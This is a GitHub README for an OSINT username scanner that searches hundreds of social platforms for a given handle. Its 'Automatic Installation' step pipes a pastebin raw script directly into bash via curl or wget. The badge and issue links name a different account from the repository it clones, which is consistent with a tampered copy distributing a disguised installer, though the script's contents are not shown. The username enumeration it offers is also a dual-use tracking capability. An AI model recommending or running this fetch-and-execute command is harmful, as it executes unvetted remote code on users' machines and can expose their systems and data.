<p align="center"><img src="https://raw.githubusercontent.com/arxhr007/Aliens_eye/main/photos/logo.png" width="450" height="400" /></p>

# AI-OSINT Username Scanner

<h3 align="center">Advanced AI-Powered Social Media Username Finder</h3>
<h4 align="center">Scan 700+ platforms with intelligent detection</h4>

<p align="center">
<a href="#"><img alt="Forks" src="https://img.shields.io/github/forks/BLINKING-IDIOT/Aliens_eye?style=for-the-badge"></a>
<a href="#"><img alt="Last Commit" src="https://img.shields.io/github/last-commit/BLINKING-IDIOT/Aliens_eye/main?color=green&style=for-the-badge"></a>
<a href="#"><img alt="Stars" src="https://img.shields.io/github/stars/BLINKING-IDIOT/Aliens_eye?style=for-the-badge&color=red"></a>
<a href="#"><img alt="License" src="https://img.shields.io/github/license/BLINKING-IDIOT/Aliens_eye?color=orange&style=for-the-badge"></a>
<a href="https://github.com/BLINKING-IDIOT/Aliens_eye/issues"><img alt="Issues" src="https://img.shields.io/github/issues/BLINKING-IDIOT/Aliens_eye?color=purple&style=for-the-badge"></a>
</p>

## ✨ New AI-Enhanced Features

- **40% More Accurate Results** - Uses AI-powered detection algorithms
- **Confidence Scoring** - Shows how certain each match is (0-100%)
- **Intelligent Pattern Recognition** - Learns from previous scans to improve accuracy
- **Domain Analysis** - Examines site structure beyond HTTP status codes
- **Smart Content Inspection** - Analyzes page content for telltale username signs

## 📋 Requirements

- Python 3.6+
- Internet connection

## 🚀 Installation

### Automatic Installation

```bash
curl -s https://pastebin.com/raw/nJqjsbNu | bash
```

OR

```bash
wget -qO- https://pastebin.com/raw/nJqjsbNu | bash
```

### Manual Installation

#### For Linux:

```bash
git clone https://github.com/arxhr007/Aliens_eye
cd Aliens_eye
bash install.sh
```

#### For Termux:

```bash
pkg update && pkg upgrade
pkg install python git
git clone https://github.com/arxhr007/Aliens_eye
cd Aliens_eye
bash termux-install.sh
```

## 💻 Usage

### Scan a username:

```bash
aliens_eye username
```

### Scan multiple usernames:

```bash
aliens_eye username1 username2 username3
```

### Load results from previous scan:

```bash
aliens_eye -r username.json
```

### Additional options:

```bash
aliens_eye -h                   # Show help
aliens_eye -v username          # Enable verbose mode
aliens_eye -c 30 username       # Set maximum concurrent connections to 30
```

You can also run the tool without arguments and it will prompt for a username:

```bash
aliens_eye
```

## 🔍 Understanding Results

Results are color-coded for quick interpretation:

- 🟢 **Green**: Found (High confidence)
- 🟡 **Yellow**: Maybe (Medium confidence)
- 🔴 **Red**: Not Found (High confidence)

Each result includes:
- Site name
- Status (Found/Maybe/Not Found)
- Confidence percentage
- HTTP code
- Response time
- Full URL

## 📊 Advanced Analysis

The scanner uses multiple factors to determine if a username exists:

1. Content keyword analysis
2. HTTP status code analysis
3. URL structure examination
4. DOM structure inspection
5. Meta tag inspection
6. Historical pattern recognition
7. Response time profiling

Results are saved in JSON format with detailed analysis for each site.

## 📱 Platform Support

- Linux (All distributions)
- Android (via Termux)

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This tool is developed for educational purposes and ethical OSINT research only. Users are responsible for complying with applicable laws and website terms of service. The developers assume no liability for misuse of this software.

## 🔗 Links

- [Report Bug](https://github.com/BLINKING-IDIOT/Aliens_eye/issues)
- [Request Feature](https://github.com/BLINKING-IDIOT/Aliens_eye/issues)

---

<p align="center">Made with ❤️ by <a href="https://github.com/arxhr007">Aaron</a></p>

<p align="center">If you find this project helpful, please consider giving it a star ⭐</p>

# Also checkout:

<a href="https://github.com/arxhr007/wifistrike" target="blank"><img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=arxhr007&repo=wifistrike&show_icons=true&theme=chartreuse-dark"></a>
<a href="https://github.com/arxhr007/Gamer-tux" target="blank"><img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=arxhr007&repo=Gamer-tux&show_icons=true&theme=chartreuse-dark"></a>
